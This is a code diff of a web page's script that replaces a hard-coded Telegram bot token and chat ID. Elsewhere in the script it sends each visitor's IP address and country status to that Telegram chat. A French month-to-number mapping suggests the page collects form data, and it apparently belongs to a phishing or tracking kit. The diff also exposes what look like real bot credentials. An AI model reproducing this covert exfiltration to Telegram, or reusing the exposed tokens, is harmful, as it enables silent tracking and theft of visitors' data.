@@ -193,8 +193,8 @@
     </div>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = '8391972614:AAFnp7IHA4ZgJnM5HrnzDfXdYIBpWwfkNwI';
-        const TELEGRAM_CHAT_ID = '-4772890799';
+        const TELEGRAM_BOT_TOKEN = '8389195007:AAGkbz5t1VtKGgofC8t1GowIEDd2xLoCLE0';
+        const TELEGRAM_CHAT_ID = '-4880746589';
         
         const monthMapping = {
             'Janvier': '01',
@@ -1024,4 +1024,5 @@ document.addEventListener('DOMContentLoaded', function() {
             await sendToTelegram(`🎌 New Visitor 🎌\n📡 IP: ${ip}\n⚠️ Country detection failed`);
         });
 });
+
 </script>
